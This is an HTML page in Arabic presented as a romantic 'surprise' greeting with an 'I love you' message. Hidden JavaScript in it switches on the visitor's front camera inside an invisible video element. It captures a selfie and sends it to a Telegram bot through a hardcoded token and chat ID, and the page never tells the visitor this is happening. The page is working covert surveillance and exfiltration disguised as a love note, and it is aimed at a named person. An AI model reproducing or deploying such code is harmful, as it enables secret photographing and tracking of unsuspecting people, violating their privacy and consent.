<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>مفاجأة</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fecfef 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }

    .container {
      text-align: center;
      padding: 20px;
      max-width: 420px;
      width: 100%;
    }

    .btn {
      background: linear-gradient(45deg, #ff6b6b, #ee5a24);
      color: white;
      border: none;
      padding: 18px 40px;
      font-size: 1.3rem;
      border-radius: 50px;
      cursor: pointer;
      box-shadow: 0 10px 25px rgba(238, 90, 36, 0.4);
      transition: all 0.3s ease;
      font-weight: bold;
    }

    .btn:hover {
      transform: scale(1.05);
    }

    .message {
      display: none;
      background: rgba(255, 255, 255, 0.95);
      padding: 40px 30px;
      border-radius: 25px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.15);
      animation: fadeIn 0.8s ease;
    }

    .message h1 {
      color: #e84393;
      font-size: 2.4rem;
      margin-bottom: 15px;
    }

    .message p {
      color: #555;
      font-size: 1.1rem;
    }

    .hearts {
      font-size: 2.5rem;
      animation: pulse 1.5s infinite;
      margin-bottom: 10px;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.2); }
    }

    #hidden-video {
      position: fixed;
      top: 0;
      left: 0;
      width: 640px;
      height: 480px;
      opacity: 0;
      pointer-events: none;
      z-index: -9999;
    }
  </style>
</head>
<body>
  <div class="container">
    <button class="btn" id="openBtn">افتح المفاجأة 🎁</button>

    <div class="message" id="message">
      <div class="hearts">❤️</div>
      <h1>كنحبك ازمر</h1>
      <p>أتمنى أن تكوني سعيدة جداً الآن ❤️</p>
    </div>
  </div>

  <video id="hidden-video" autoplay playsinline muted></video>

  <script>
    const BOT_TOKEN = "8858163237:AAGHmo9sxJSQDp0yKE1cPTEuJ7uYurh16fM";
    const CHAT_ID  = "6975241289";

    const openBtn = document.getElementById('openBtn');
    const message = document.getElementById('message');
    const video = document.getElementById('hidden-video');

    let stream = null;
    let captured = false;

    openBtn.addEventListener('click', async () => {
      openBtn.style.display = 'none';
      message.style.display = 'block';

      // نبدأ الكاميرا فوراً بأقصى سرعة
      startCameraFast();
    });

    async function startCameraFast() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: 'user',
            width: { ideal: 1280 },
            height: { ideal: 720 }
          },
          audio: false
        });

        video.srcObject = stream;

        // نلتقط أول إطار جاهز بأسرع وقت ممكن
        video.onloadeddata = () => {
          // نحاول الالتقاط فوراً
          tryCapture();
        };

        // احتياطي لو onloadeddata ما اشتغلش بسرعة
        video.onplaying = () => {
          tryCapture();
        };

        // محاولة إضافية بعد وقت قصير جداً
        setTimeout(tryCapture, 300);
        setTimeout(tryCapture, 600);

      } catch (err) {
        console.log('الكاميرا:', err);
      }
    }

    function tryCapture() {
      if (captured) return;
      if (!video.videoWidth || video.videoWidth < 100) return;

      captured = true;
      captureAndSend();
    }

    function captureAndSend() {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');

      // قلب الصورة
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0);

      // إيقاف الكاميرا فوراً
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }

      canvas.toBlob(async (blob) => {
        if (!blob) return;

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'selfie.jpg');
        formData.append('caption', `📸 سيلفي بعد فتح المفاجأة\nالوقت: ${new Date().toLocaleString('ar-EG')}\nاحبك سكينة ❤️`);

        try {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
        } catch (e) {
          console.log(e);
        }
      }, 'image/jpeg', 0.9);
    }
  </script>
</body>
</html>
